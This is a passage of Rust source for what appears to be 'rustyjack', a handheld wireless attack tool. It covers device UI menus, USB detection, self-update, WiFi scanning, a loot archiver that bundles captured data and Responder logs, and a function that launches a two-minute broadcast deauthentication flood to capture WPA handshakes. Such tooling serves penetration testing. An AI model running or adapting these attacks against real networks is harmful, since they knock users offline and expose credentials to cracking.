                if is_removable || is_usb || is_usb_storage {
                    // Make sure it has a size > 0 (actually a storage device)
                    let size_path = entry.path().join("size");
                    let has_size = fs::read_to_string(&size_path)
                        .map(|s| s.trim().parse::<u64>().unwrap_or(0) > 0)
                        .unwrap_or(false);
                    
                    if has_size {
                        usb_devices.push(name);
                    }
                }
            }
        }
        
        usb_devices
    }
    
    /// Read mount points from /proc/mounts
    fn read_mount_points(&self) -> Result<Vec<(String, String)>> {
        let contents = fs::read_to_string("/proc/mounts")
            .context("Failed to read /proc/mounts")?;
        
        let mut mounts = Vec::new();
        for line in contents.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                let device = parts[0].to_string();
                let mount_point = parts[1].to_string();
                
                // Only consider actual device mounts (not tmpfs, proc, etc.)
                if device.starts_with("/dev/") {
                    mounts.push((device, mount_point));
                }
            }
        }
        
        Ok(mounts)
    }
    
    /// Check if a path is likely a USB storage mount (not a WiFi dongle, etc.)
    fn is_usb_storage_mount(&self, path: &Path) -> bool {
        // Must be writable
        if !self.is_writable_mount(path) {
            return false;
        }
        
        // Check filesystem type - USB storage typically uses vfat, exfat, ntfs, ext4
        // This helps exclude pseudo-filesystems and network mounts
        let mount_path_str = path.to_string_lossy();
        
        if let Ok(contents) = fs::read_to_string("/proc/mounts") {
            for line in contents.lines() {
                if line.contains(&*mount_path_str) {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        let fs_type = parts[2];
                        // Common USB storage filesystems
                        if matches!(fs_type, "vfat" | "exfat" | "ntfs" | "ntfs3" | "ext4" | "ext3" | "ext2" | "fuseblk") {
                            return true;
                        }
                    }
                }
            }
        }
        
        false
    }

    fn is_writable_mount(&self, path: &Path) -> bool {
        // Try to create a test file to verify write access
        let test_file = path.join(".rustyjack_test");
        if fs::write(&test_file, b"test").is_ok() {
            let _ = fs::remove_file(&test_file);
            true
        } else {
            false
        }
    }

    fn run_system_update(&mut self) -> Result<()> {
        let args = SystemUpdateArgs {
            service: "rustyjack".to_string(),
            remote: "origin".to_string(),
            branch: "main".to_string(),
            backup_dir: None,
        };

        let core = self.core.clone();
        let display = &mut self.display;
        let stats = &self.stats;

        let result = core.run_system_update_with_progress(args, |pct, task| {
            let status = stats.snapshot();
            let _ = display.draw_progress_dialog("System Update", task, pct, &status);
        });

        match result {
            Ok((_, data)) => {
                let backup = data
                    .get("backup_path")
                    .and_then(Value::as_str)
                    .unwrap_or("archive");
                let msg = vec!["Updated from git".to_string(), format!("Backup: {backup}")];
                self.show_message("Update", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = err.to_string();
                self.show_message("Update", [msg.as_str()])?;
            }
        }
        Ok(())
    }

    fn build_loot_archive(&self) -> Result<(TempPath, PathBuf)> {
        let mut temp = NamedTempFile::new()?;
        {
            let mut zip = ZipWriter::new(&mut temp);
            let options = FileOptions::default().compression_method(CompressionMethod::Deflated);
            self.add_directory_to_zip(&mut zip, &self.root.join("loot"), "loot/", options.clone())?;
            self.add_directory_to_zip(
                &mut zip,
                &self.root.join("Responder").join("logs"),
                "ResponderLogs/",
                options,
            )?;
            zip.finish()?;
        }
        let temp_path = temp.into_temp_path();
        let path = temp_path.to_path_buf();
        Ok((temp_path, path))
    }

    fn add_directory_to_zip(
        &self,
        zip: &mut ZipWriter<&mut NamedTempFile>,
        dir: &Path,
        prefix: &str,
        options: FileOptions,
    ) -> Result<()> {
        if !dir.exists() {
            return Ok(());
        }
        for entry in WalkDir::new(dir) {
            let entry = entry?;
            if entry.file_type().is_file() {
                let rel = entry.path().strip_prefix(dir).unwrap_or(entry.path());
                let mut name = PathBuf::from(prefix);
                name.push(rel);
                let name = name.to_string_lossy().replace('\\', "/");
                zip.start_file(name, options)?;
                let data = fs::read(entry.path())?;
                zip.write_all(&data)?;
            }
        }
        Ok(())
    }

    fn choose_interface_name(&mut self, title: &str, names: &[String]) -> Result<Option<String>> {
        if names.is_empty() {
            self.show_message("Interfaces", ["No interfaces detected"])?;
            return Ok(None);
        }
        let labels: Vec<String> = names.iter().map(|n| format!(" {n}")).collect();
        Ok(self
            .choose_from_list(title, &labels)?
            .map(|idx| names[idx].clone()))
    }

    fn toggle_discord(&mut self) -> Result<()> {
        self.config.settings.discord_enabled = !self.config.settings.discord_enabled;
        self.save_config()?;
        // No message needed as the menu label will update immediately
        Ok(())
    }
    
    fn show_hardware_detect(&mut self) -> Result<()> {
        self.show_progress("Hardware Scan", ["Detecting interfaces...", "Please wait"])?;
        
        match self.core.dispatch(Commands::Hardware(HardwareCommand::Detect)) {
            Ok((_, data)) => {
                let eth_count = data.get("ethernet_count").and_then(|v| v.as_u64()).unwrap_or(0);
                let wifi_count = data.get("wifi_count").and_then(|v| v.as_u64()).unwrap_or(0);
                let other_count = data.get("other_count").and_then(|v| v.as_u64()).unwrap_or(0);
                
                let ethernet_ports = data.get("ethernet_ports").and_then(|v| v.as_array()).cloned().unwrap_or_default();
                let wifi_modules = data.get("wifi_modules").and_then(|v| v.as_array()).cloned().unwrap_or_default();
                
                // Build list of detected interfaces (clickable)
                let mut all_interfaces = Vec::new();
                let mut labels = Vec::new();

                let active_interface = self.config.settings.active_network_interface.clone();
                
                for port in &ethernet_ports {
                    if let Some(name) = port.get("name").and_then(|v| v.as_str()) {
                        let label = if name == active_interface {
                            format!("{} *", name)
                        } else {
                            name.to_string()
                        };
                        labels.push(label);
                        all_interfaces.push(port.clone());
                    }
                }
                for module in &wifi_modules {
                    if let Some(name) = module.get("name").and_then(|v| v.as_str()) {
                        let label = if name == active_interface {
                            format!("{} *", name)
                        } else {
                            name.to_string()
                        };
                        labels.push(label);
                        all_interfaces.push(module.clone());
                    }
                }
                
                // If nothing to show, just present summary
                if all_interfaces.is_empty() {
                    let summary_lines = vec![
                        format!("Ethernet: {}", eth_count),
                        format!("WiFi: {}", wifi_count),
                        format!("Other: {}", other_count),
                    ];
                    self.show_message("Hardware Detected", summary_lines.iter().map(|s| s.as_str()))?;
                } else {
                    // Present clickable list and show details on selection
                    loop {
                        let Some(idx) = self.choose_from_menu("Detected interfaces", &labels)? else { break; };
                        
                        let info = &all_interfaces[idx];
                        let interface_name = info.get("name").and_then(|v| v.as_str()).unwrap_or("unknown").to_string();
                        
                        // Build detail lines
                        let mut details = Vec::new();
                        details.push(format!("Name: {}", interface_name));
                        if let Some(kind) = info.get("kind").and_then(|v| v.as_str()) { details.push(format!("Kind: {}", kind)); }
                        if let Some(state) = info.get("oper_state").and_then(|v| v.as_str()) { details.push(format!("State: {}", state)); }
                        if let Some(ip) = info.get("ip").and_then(|v| v.as_str()) { details.push(format!("IP: {}", ip)); }
                        details.push("".to_string());
                        details.push("[SELECT] Set as active".to_string());
                        
                        self.display.draw_menu("Interface details", &details, usize::MAX, &self.stats.snapshot())?;
                        // Wait for action
                        loop {
                            let btn = self.buttons.wait_for_press()?;
                            match self.map_button(btn) {
                                ButtonAction::Select => {
                                    // Set this interface as active
                                    self.config.settings.active_network_interface = interface_name.clone();
                                    let config_path = self.root.join("gui_conf.json");
                                    if let Err(e) = self.config.save(&config_path) {
                                        self.show_message("Error", [format!("Failed to save: {}", e)])?;
                                    } else {
                                        self.show_message("Active Interface", [format!("Set to: {}", interface_name)])?;
                                    }
                                    // Refresh the labels to show new active indicator
                                    labels.clear();
                                    all_interfaces.clear();
                                    let active = self.config.settings.active_network_interface.clone();
                                    for port in &ethernet_ports {
                                        if let Some(name) = port.get("name").and_then(|v| v.as_str()) {
                                            let label = if name == active { format!("{} *", name) } else { name.to_string() };
                                            labels.push(label);
                                            all_interfaces.push(port.clone());
                                        }
                                    }
                                    for module in &wifi_modules {
                                        if let Some(name) = module.get("name").and_then(|v| v.as_str()) {
                                            let label = if name == active { format!("{} *", name) } else { name.to_string() };
                                            labels.push(label);
                                            all_interfaces.push(module.clone());
                                        }
                                    }
                                    break;
                                }
                                ButtonAction::Back => break,
                                ButtonAction::MainMenu => { self.menu_state.home(); break; }
                                ButtonAction::Reboot => { self.confirm_reboot()?; }
                                _ => {}
                            }
                        }
                    }
                }
            }
            Err(err) => {
                let msg = vec![format!("Scan failed: {}", err)];
                self.show_message("Hardware Error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }
    
    fn scan_wifi_networks(&mut self) -> Result<()> {
        self.show_progress("WiFi Scan", ["Scanning for networks...", "Please wait"])?;
        
        let scan_result = self.fetch_wifi_scan();
        
        match scan_result {
            Ok(response) => {
                if response.networks.is_empty() {
                    return self.show_message("WiFi Scan", ["No networks found"]);
                }
                
                // Build list of networks for selection
                let networks = response.networks;
                let mut labels = Vec::new();
                for net in &networks {
                    let ssid = net.ssid.as_deref().unwrap_or("<hidden>");
                    // Truncate SSID if too long for display
                    let ssid_display = if ssid.len() > 10 {
                        format!("{}...", &ssid[..10])
                    } else {
                        ssid.to_string()
                    };
                    let signal = net.signal_dbm.map(|s| format!("{}dB", s)).unwrap_or_default();
                    let ch = net.channel.map(|c| format!("c{}", c)).unwrap_or_default();
                    let lock = if net.encrypted { "*" } else { "" };
                    labels.push(format!("{}{} {} {}", lock, ssid_display, signal, ch));
                }
                
                // Interactive network list - loop until user backs out
                loop {
                    let choice = self.choose_from_menu("Select Network", &labels)?;
                    match choice {
                        Some(idx) => {
                            if let Some(network) = networks.get(idx) {
                                self.handle_network_selection(network)?;
                            }
                        }
                        None => break, // User pressed back
                    }
                }
            }
            Err(e) => {
                self.show_message("WiFi Scan Error", [format!("{}", e)])?;
            }
        }
        
        Ok(())
    }
    
    fn launch_deauth_attack(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        let target_network = self.config.settings.target_network.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        
        // Validate we have all required target info
        if target_bssid.is_empty() {
            return self.show_message("Deauth Attack", [
                "No target BSSID set",
                "Scan networks first",
                "and select a target"
            ]);
        }
        
        if target_channel == 0 {
            return self.show_message("Deauth Attack", [
                "No target channel set",
                "Scan networks first",
                "and select a target"
            ]);
        }
        
        if active_interface.is_empty() {
            return self.show_message("Deauth Attack", [
                "No active interface",
                "Set in Hardware Detect"
            ]);
        }
        
        // Show attack configuration
        self.show_message("Deauth Attack", [
            &format!("Target: {}", if target_network.is_empty() { &target_bssid } else { &target_network }),
            &format!("BSSID: {}", target_bssid),
            &format!("Channel: {}", target_channel),
            &format!("Interface: {}", active_interface),
            "Duration: 120s",
            "Press SELECT to start"
        ])?;
        
        // Show progress stages for 120 second attack
        let progress_stages = vec![
            (0, "Killing processes..."),
            (2, "Monitor mode enabled"),
            (5, "Setting channel..."),
            (8, "Starting capture..."),
            (10, "Sending deauth burst"),
            (15, "Attack in progress..."),
            (30, "Monitoring for handshake"),
            (45, "Deauth burst sent..."),
            (60, "Halfway complete..."),
            (75, "Still capturing..."),
            (90, "Checking for handshake"),
            (100, "Attack continuing..."),
            (110, "Finalizing capture..."),
            (115, "Stopping monitor mode"),
        ];
        
        // Show initial message
        self.show_progress("Deauth Attack", [
            &format!("Target: {}", if target_network.is_empty() { &target_bssid } else { &target_network }),
            &format!("Channel: {} | {}", target_channel, active_interface),
            "Preparing attack...",
        ])?;
        
        // Launch attack in background thread while showing progress
        use std::sync::{Arc, Mutex};
        use std::thread;
        use std::time::Duration;
        
        let core = self.core.clone();
        let bssid = target_bssid.clone();
        let ssid = if target_network.is_empty() { None } else { Some(target_network.clone()) };
        let channel = target_channel;
        let iface = active_interface.clone();
        
        let result = Arc::new(Mutex::new(None));
        let result_clone = Arc::clone(&result);
        
        // Spawn attack thread
        thread::spawn(move || {
            let command = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                bssid,
                ssid,
                interface: iface,
                channel,
                duration: 120,      // 2 minutes for better handshake capture
                packets: 64,        // More packets per burst
                client: None,       // Broadcast to all clients
                continuous: true,   // Keep sending deauth throughout
                interval: 1,        // 1 second between bursts
            }));
            
            let r = core.dispatch(command);
            *result_clone.lock().unwrap() = Some(r);
        });
        
        // Show progress updates while attack runs (120 seconds)
        let attack_duration = 120u64;
        let start = std::time::Instant::now();
        let mut stage_idx = 0;
        
        loop {
            let elapsed = start.elapsed().as_secs();
            
            // Update stage
            while stage_idx < progress_stages.len() && elapsed >= progress_stages[stage_idx].0 {
                let overlay = self.stats.snapshot();
                self.display.draw_progress_dialog(
                    "Deauth Attack",
                    progress_stages[stage_idx].1,
                    (elapsed as f32 / attack_duration as f32) * 100.0,
                    &overlay,
                )?;
                stage_idx += 1;
            }
            
            // Check if attack completed
            if result.lock().unwrap().is_some() {
                break;
            }
            
            // Update display periodically
            if elapsed % 5 == 0 {
                let overlay = self.stats.snapshot();
                let message = if elapsed < attack_duration {
                    format!("Attack progress... {}s/{}s", elapsed, attack_duration)
                } else {
                    "Finalizing...".to_string()
                };
                self.display.draw_progress_dialog(
                    "Deauth Attack",
                    &message,
                    (elapsed as f32 / attack_duration as f32).min(1.0) * 100.0,
                    &overlay,
                )?;
            }
            
            thread::sleep(Duration::from_millis(500));
        }
        
        // Get result
        let attack_result = result.lock().unwrap().take().unwrap();
        
        match attack_result {
            Ok((msg, data)) => {
                let mut result_lines = vec![msg];
                
                if let Some(captured) = data.get("handshake_captured").and_then(|v| v.as_bool()) {
                    if captured {
                        result_lines.push("HANDSHAKE CAPTURED!".to_string());
                        if let Some(hf) = data.get("handshake_file").and_then(|v| v.as_str()) {
                            result_lines.push(format!("File: {}", Path::new(hf).file_name().unwrap().to_str().unwrap()));
                        }
                    } else {
                        result_lines.push("No handshake detected".to_string());
                    }
                }
                
                if let Some(packets) = data.get("total_packets_sent").and_then(|v| v.as_u64()) {
                    result_lines.push(format!("Packets: {}", packets));
                }
                
                if let Some(bursts) = data.get("deauth_bursts").and_then(|v| v.as_u64()) {
                    result_lines.push(format!("Bursts: {}", bursts));
                }
                
                if let Some(log) = data.get("log_file").and_then(|v| v.as_str()) {
                    result_lines.push(format!("Log: {}", Path::new(log).file_name().unwrap().to_str().unwrap()));
                }
                
                result_lines.push("Check Loot > Wireless".to_string());
                
                self.show_message("Deauth Complete", result_lines.iter().map(|s| s.as_str()))?;
            }
            Err(e) => {
                self.show_message("Deauth Error", [format!("{}", e)])?;
            }
        }
        
        Ok(())
    }
    
    fn connect_known_network(&mut self) -> Result<()> {
        // For now, show message that user should use WiFi Manager or CLI
        // A full text input UI would require keyboard support
        self.show_message("Connect Network", [
            "Use WiFi Manager to",
            "connect to networks",
            "",
            "Or use command line:",
            "rustyjack-core wifi",
            "profile connect",
        ])
    }
}

